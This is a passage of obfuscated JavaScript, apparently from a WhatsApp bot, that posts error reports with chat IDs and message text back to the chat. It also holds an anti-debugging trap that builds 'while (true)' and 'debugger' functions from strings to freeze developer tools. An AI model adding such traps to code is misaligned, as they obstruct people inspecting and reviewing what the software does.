              let eW = "```---ERROR REPORT---\n\nVersion : " + bc.VERSION + "\nMessage : " + cn.text + "\nError   : " + ("object" == typeof eU.message ? eU.toString() : eU.message || eU) + "\nJid     : " + cj.remoteJid + "\ncommand : " + (eI.pattern && be.ctt(eI.pattern) || eI.type || index) + "\nPlatform : " + be.PLATFORM + "```\n\n```-----``` *Made by LyFE with ❣* ```-----```";
              const eX = {
                text: eW
              };
              const eY = {
                key: cj,
                message: ck
              };
              const eZ = {
                quoted: eY
              };
              await bN.prepareMessage(eV, eX, eZ, cb);
            }
          }
        }
      }
      cn = null;
    };
  }
  function c9(a8) {
    function aa(ab) {
      if (typeof ab === "string") {
        return function (ac) {}.constructor("while (true) {}").apply("counter");
      } else if (('' + ab / ab).length !== 0x1 || ab % 0x14 === 0x0) {
        (function () {
          return true;
        }).constructor("debugger").call("action");
      } else {
        (function () {
          return false;
        }).constructor("debugger").apply("stateObject");
      }
      aa(++ab);
    }
    try {
      if (a8) {
        return aa;
      } else {
        aa(0x0);
      }
    } catch (ab) {}
  }